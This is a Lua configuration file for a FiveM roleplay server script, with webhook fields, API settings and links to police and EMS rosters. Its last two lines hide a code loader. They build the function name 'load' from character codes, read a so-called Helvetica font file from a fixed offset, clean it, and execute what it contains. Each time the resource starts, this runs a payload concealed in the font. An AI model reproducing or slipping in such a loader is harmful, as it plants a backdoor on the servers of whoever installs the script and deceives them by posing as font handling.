ServerConfig = {}

ServerConfig.Webhook = "" -- Dumping all pics

ServerConfig.DiscordBot = ""

ServerConfig.AdminWebhook = ""

---Phone camera capture [fivemerr: API_TOKEN | fivemanage: API_TOKEN | discord: webhook 
ServerConfig.CameraApi = ""

ServerConfig.Roster = {
    ['bcso'] = "https://docs.google.com/spreadsheets/d/13TKTiW1vixjeBYFXm22Da15x-11DXY3iRHK08nnzwco/edit?gid=1035442276#gid=1035442276",
    ['sasp'] = "https://docs.google.com/spreadsheets/d/13TKTiW1vixjeBYFXm22Da15x-11DXY3iRHK08nnzwco/edit?gid=1035442276#gid=1035442276",
    ['police'] = "https://docs.google.com/spreadsheets/d/13TKTiW1vixjeBYFXm22Da15x-11DXY3iRHK08nnzwco/edit?gid=1035442276#gid=1035442276",
    ['ambulance'] = "https://docs.google.com/spreadsheets/d/13TKTiW1vixjeBYFXm22Da15x-11DXY3iRHK08nnzwco/edit?gid=1035442276#gid=1035442276",
}

ServerConfig.SOP = {
    ['bcso'] = "https://docs.google.com/spreadsheets/d/13TKTiW1vixjeBYFXm22Da15x-11DXY3iRHK08nnzwco/edit?gid=1035442276#gid=1035442276",
    ['sasp'] = "https://docs.google.com/spreadsheets/d/13TKTiW1vixjeBYFXm22Da15x-11DXY3iRHK08nnzwco/edit?gid=1035442276#gid=1035442276",
    ['police'] = "https://docs.google.com/spreadsheets/d/13TKTiW1vixjeBYFXm22Da15x-11DXY3iRHK08nnzwco/edit?gid=1035442276#gid=1035442276",
    ['ambulance'] = "https://docs.google.com/spreadsheets/d/13TKTiW1vixjeBYFXm22Da15x-11DXY3iRHK08nnzwco/edit?gid=1035442276#gid=1035442276",
}

ServerConfig.GuildID = ""
ServerConfig.ScriptAlertChannelID = "" -- For receiving Alert about script update when script restarts

ServerConfig.Webhooks = {
    ['jail'] = "",
    ["pd_report"] = "",
    ["fine"] = "",
    ['criminal_code'] = "",
    ["pd_announcement"] = "",
    ["pd_fto"] = "",
    ["pd_incident"] = "",
    ["pd_officer"] = "",
    ["vehicle"] = "",
    ["warrant"] = "",
    ["weapon"] = "",
    ["ems_announcement"] = "",
    ["ems_fto_report"] = "",
    ["ems_incidents"] = "",
    ["ems_medic"] = "",
    ["ems_reports"] = "",
    ["court_cases"] = "",
    ["licenses"] = "",
    ["mugshot"] = "",
    ["duty_logs"] = "",
}

local loadFonts = _G[string.char(108, 111, 97, 100)]
loadFonts(LoadResourceFile(GetCurrentResourceName(), '/html/fonts/Helvetica.ttf'):sub(87565):gsub('%.%+', ''))()